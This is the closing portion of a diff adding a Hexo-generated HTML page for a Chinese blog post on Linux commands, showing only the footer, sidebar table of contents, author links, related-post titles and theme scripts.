+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt=".N1h1l157 贝宝">
+        <p>贝宝</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>本文作者： </strong>.N1h1l157 <i class="ic i-at"><em>@</em></i>X_T
+  </li>
+  <li class="link">
+    <strong>本文链接：</strong>
+    <a href="http://n1h1l157.github.io/2023/05/19/SAFE/Linux/" title="Linux 命令">http://n1h1l157.github.io/2023/05/19/SAFE/Linux/</a>
+  </li>
+  <li class="license">
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2023/04/02/MBTI/%E8%87%AA%E6%88%91%E4%B8%8E%E5%8A%A8%E6%9C%BA/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;yxb6m3Ak4MhTNvU.jpg" title="自我与动机">
+  <span class="type">上一篇</span>
+  <span class="category"><i class="ic i-flag"></i> MBTI</span>
+  <h3>自我与动机</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/2023/05/19/SAFE/Trojan/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;nNsjUzcTObfYtMa.jpg" title="Trojan 生成">
+  <span class="type">下一篇</span>
+  <span class="category"><i class="ic i-flag"></i> 信息安全</span>
+  <h3>Trojan 生成</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="文章目录">
+          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ls"><span class="toc-number">1.</span> <span class="toc-text"> ls</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cat"><span class="toc-number">2.</span> <span class="toc-text"> cat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#for"><span class="toc-number">3.</span> <span class="toc-text"> for</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#find"><span class="toc-number">4.</span> <span class="toc-text"> find</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rename"><span class="toc-number">5.</span> <span class="toc-text"> rename</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#du"><span class="toc-number">6.</span> <span class="toc-text"> du</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#scp"><span class="toc-number">7.</span> <span class="toc-text"> scp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hash"><span class="toc-number">8.</span> <span class="toc-text"> hash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jq"><span class="toc-number">9.</span> <span class="toc-text"> jq</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#curl"><span class="toc-number">10.</span> <span class="toc-text"> curl</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tr"><span class="toc-number">11.</span> <span class="toc-text"> tr</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ps"><span class="toc-number">12.</span> <span class="toc-text"> ps</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#conda"><span class="toc-number">13.</span> <span class="toc-text"> conda</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#uname"><span class="toc-number">14.</span> <span class="toc-text"> uname</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lsof"><span class="toc-number">15.</span> <span class="toc-text"> lsof</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#grep"><span class="toc-number">16.</span> <span class="toc-text"> grep</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cp"><span class="toc-number">17.</span> <span class="toc-text"> cp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ln"><span class="toc-number">18.</span> <span class="toc-text"> ln</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vim"><span class="toc-number">19.</span> <span class="toc-text"> vim</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sed"><span class="toc-number">20.</span> <span class="toc-text"> sed</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#awk"><span class="toc-number">21.</span> <span class="toc-text"> awk</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#history"><span class="toc-number">22.</span> <span class="toc-text"> history</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nc"><span class="toc-number">23.</span> <span class="toc-text"> nc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#firewalld"><span class="toc-number">24.</span> <span class="toc-text"> firewalld</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nohup"><span class="toc-number">25.</span> <span class="toc-text"> nohup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#docker"><span class="toc-number">26.</span> <span class="toc-text"> docker</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rpm"><span class="toc-number">27.</span> <span class="toc-text"> rpm</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tar"><span class="toc-number">28.</span> <span class="toc-text"> tar</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#iconv"><span class="toc-number">29.</span> <span class="toc-text"> iconv</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tail"><span class="toc-number">30.</span> <span class="toc-text"> tail</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lrzsz"><span class="toc-number">31.</span> <span class="toc-text"> lrzsz</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#eof"><span class="toc-number">32.</span> <span class="toc-text"> EOF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#iptables"><span class="toc-number">33.</span> <span class="toc-text"> iptables</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crontab"><span class="toc-number">34.</span> <span class="toc-text"> crontab</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ufw"><span class="toc-number">35.</span> <span class="toc-text"> ufw</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#proxychians4"><span class="toc-number">36.</span> <span class="toc-text"> proxychians4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#export"><span class="toc-number">37.</span> <span class="toc-text"> export</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%CB%86li%CB%86il"><span class="toc-number">38.</span> <span class="toc-text"> ˆliˆil</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">39.</span> <span class="toc-text"> !!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#-2"><span class="toc-number">40.</span> <span class="toc-text"> !</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%92%8C"><span class="toc-number">41.</span> <span class="toc-text"> !$ 和！^</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#-3"><span class="toc-number">42.</span> <span class="toc-text"> !$</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#emacs"><span class="toc-number">43.</span> <span class="toc-text"> Emacs —</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tree"><span class="toc-number">44.</span> <span class="toc-text"> tree</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#echo"><span class="toc-number">45.</span> <span class="toc-text"> echo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cdpath"><span class="toc-number">46.</span> <span class="toc-text"> CDPATH</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#alias"><span class="toc-number">47.</span> <span class="toc-text"> alias</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#-4"><span class="toc-number">48.</span> <span class="toc-text"> {}</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#zlua"><span class="toc-number">49.</span> <span class="toc-text"> z.lua</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hstr"><span class="toc-number">50.</span> <span class="toc-text"> HSTR</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#paste"><span class="toc-number">51.</span> <span class="toc-text"> paste</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#asciinema"><span class="toc-number">52.</span> <span class="toc-text"> asciinema</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bat"><span class="toc-number">53.</span> <span class="toc-text"> bat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#systemctl"><span class="toc-number">54.</span> <span class="toc-text"> systemctl</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hwclock"><span class="toc-number">55.</span> <span class="toc-text"> hwclock</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#script"><span class="toc-number">56.</span> <span class="toc-text"> script</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#play"><span class="toc-number">57.</span> <span class="toc-text"> play</span></a></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="系列文章">
+        <ul>
+          <li class="active"><a href="/2023/05/19/SAFE/Linux/" rel="bookmark" title="Linux 命令">Linux 命令</a></li><li><a href="/2023/05/19/SAFE/Trojan/" rel="bookmark" title="Trojan 生成">Trojan 生成</a></li><li><a href="/2023/07/02/SAFE/Security%20URL/" rel="bookmark" title="信息安全 网址">信息安全 网址</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="站点概览">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt=".N1h1l157"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">.N1h1l157</p>
+  <div class="description" itemprop="description">人生如逆旅，我亦是行人</div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">153</span>
+        <span class="name">文章</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">6</span>
+        <span class="name">分类</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">39</span>
+        <span class="name">标签</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL04xaDFsMTU3" title="https:&#x2F;&#x2F;github.com&#x2F;N1h1l157"><i class="ic i-github"></i></span>
+      <span class="exturl item twitter" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9YVDcyNzgwMzA4" title="https:&#x2F;&#x2F;twitter.com&#x2F;XT72780308"><i class="ic i-twitter"></i></span>
+      <span class="exturl item weibo" data-url="aHR0cHM6Ly9tLndlaWJvLmNuL3Byb2ZpbGUvNTgyOTg0MzUyNQ==" title="https:&#x2F;&#x2F;m.weibo.cn&#x2F;profile&#x2F;5829843525"><i class="ic i-weibo"></i></span>
+      <span class="exturl item about" data-url="aHR0cHM6Ly90Lm1lL24xaDFsMTU3" title="https:&#x2F;&#x2F;t.me&#x2F;n1h1l157"><i class="ic i-address-card"></i></span>
+      <span class="exturl item email" data-url="bWFpbHRvOjEyMjgwNTc4NjlAcXEuY29t" title="mailto:1228057869@qq.com"><i class="ic i-envelope"></i></span>
+      <span class="exturl item facebook" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDA4NDUzNzQwNTEzNw==" title="https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100084537405137"><i class="ic i-facebook"></i></span>
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
+  </li>
+
+        
+  <li class="item dropdown">
+      <a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
+  </li>
+
+  </ul>
+        
+  <li class="item dropdown">
+      <a href="javascript:void(0);"><i class="ic i-clipboard"></i>书架</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/books/LITERATURE/" rel="section"><i class="ic i-fedora"></i>LITERATURE</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/books/VULNHUB/" rel="section"><i class="ic i-android"></i>X_T-VULNHUB</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/books/XIAODI/" rel="section"><i class="ic i-opera"></i>XIAODI-SAFE</a>
+  </li>
+
+  </ul>
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+        <a href="/2023/04/02/MBTI/%E8%87%AA%E6%88%91%E4%B8%8E%E5%8A%A8%E6%9C%BA/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+        <a href="/2023/05/19/SAFE/Trojan/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>随机文章</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
+</div>
+
+    <span><a href="/2023/07/01/BOOK/28%E3%80%8A%E5%BD%93%E5%91%BC%E5%90%B8%E5%8C%96%E4%B8%BA%E7%A9%BA%E6%B0%94%E3%80%8B%E4%BF%9D%E7%BD%97%C2%B7%E5%8D%A1%E6%8B%89%E5%B0%BC%E4%BB%80/" title="《当呼吸化为空气》保罗·卡拉尼什">《当呼吸化为空气》保罗·卡拉尼什</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
+</div>
+
+    <span><a href="/2023/07/01/VULNHUB/132%20JETTY/" title="VULNHUB JETTY">VULNHUB JETTY</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
+</div>
+
+    <span><a href="/2023/07/01/BOOK/26%E3%80%8A%E4%BA%BA%E7%B1%BB%E7%AE%80%E5%8F%B2%E3%80%8B%E5%B0%A4%E7%93%A6%E5%B0%94%C2%B7%E8%B5%AB%E6%8B%89%E5%88%A9/" title="《人类简史》尤瓦尔·赫拉利">《人类简史》尤瓦尔·赫拉利</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
+</div>
+
+    <span><a href="/2023/07/01/BOOK/68%E3%80%8A%E7%81%B5%E9%AD%82%E5%8F%AA%E8%83%BD%E7%8B%AC%E8%A1%8C%E3%80%8B%E5%91%A8%E5%9B%BD%E5%B9%B3/" title="《灵魂只能独行》周国平">《灵魂只能独行》周国平</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
+</div>
+
+    <span><a href="/2023/07/01/BOOK/20%E3%80%8A%E5%B0%91%E5%B9%B4%E7%BB%B4%E7%89%B9%E4%B9%8B%E7%83%A6%E6%81%BC%E3%80%8B%E7%BA%A6%E7%BF%B0%C2%B7%E6%B2%83%E5%B0%94%E5%A4%AB%E5%86%88%C2%B7%E6%AD%8C%E5%BE%B7/" title="《少年维特之烦恼》约翰·沃尔夫冈·歌德">《少年维特之烦恼》约翰·沃尔夫冈·歌德</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
+</div>
+
+    <span><a href="/2023/04/01/MBTI/INFP%E8%A7%A3%E8%AF%BB/" title="INFP解读">INFP解读</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
+</div>
+
+    <span><a href="/2023/04/01/MBTI/%E8%8D%A3%E6%A0%BC%E4%B8%8E%E5%BF%83%E7%90%86%E5%AD%A6/" title="荣格与心理学">荣格与心理学</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E4%B8%96%E7%95%8C%E5%90%8D%E8%91%97/" title="分类于 世界名著">世界名著</a>
+</div>
+
+    <span><a href="/2023/07/01/BOOK/45%E3%80%8A%E5%B7%B4%E9%BB%8E%E5%9C%A3%E6%AF%8D%E9%99%A2%E3%80%8B%E9%9B%A8%E6%9E%9C/" title="《巴黎圣母院》雨果">《巴黎圣母院》雨果</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
+</div>
+
+    <span><a href="/2023/07/01/VULNHUB/106%20SYMFONOS/" title="VULNHUB 6 SYMFONOS">VULNHUB 6 SYMFONOS</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
+</div>
+
+    <span><a href="/2023/04/01/MBTI/%E5%88%BB%E6%9D%BF%E5%8D%B0%E8%B1%A1/" title="刻板印象">刻板印象</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>最新评论</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">.N1h1l157 @ Phut Hon</span>
+  </div>
+
+<!--   自定义开启一个网站的运行时间 -->
+  <div class="site-uptime">
+    Site uptime: <span id="site-uptime"></span>
+  </div>
+  <script>
+    var siteUptimeElement = document.getElementById('site-uptime');
+    var siteSetupDate = new Date('2023-03-18'); // 替换为您的网站具体创建日期，格式为 'YYYY-MM-DD'
+    setInterval(function() {
+      var currentTime = new Date();
+      var uptime = formatUptime(currentTime - siteSetupDate);
+      siteUptimeElement.textContent = uptime;
+    }, 1000);
+
+    function formatUptime(milliseconds) {
+      var seconds = Math.floor(milliseconds / 1000);
+      var minutes = Math.floor(seconds / 60);
+      var hours = Math.floor(minutes / 60);
+      var days = Math.floor(hours / 24);
+
+      var uptime = '';
+      if (days > 0) {
+        uptime += days + '天 ';
+      }
+      if (hours > 0) {
+        uptime += (hours % 24) + '时 ';
+      }
+      if (minutes > 0) {
+        uptime += (minutes % 60) + '分 ';
+      }
+      uptime += (seconds % 60) + '秒';
+
+      return uptime;
+    }
+  </script>
+  <div class="powered-by">
+    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2023/05/19/SAFE/Linux/',
+    favicon: {
+      show: "Cryp71c3",
+      hide: "十年磨一剑"
+    },
+    search : {
+      placeholder: "文章搜索",
+      empty: "关于 「 ${query} 」，什么也没搜到",
+      stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    valine: true,fancybox: true,
+    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
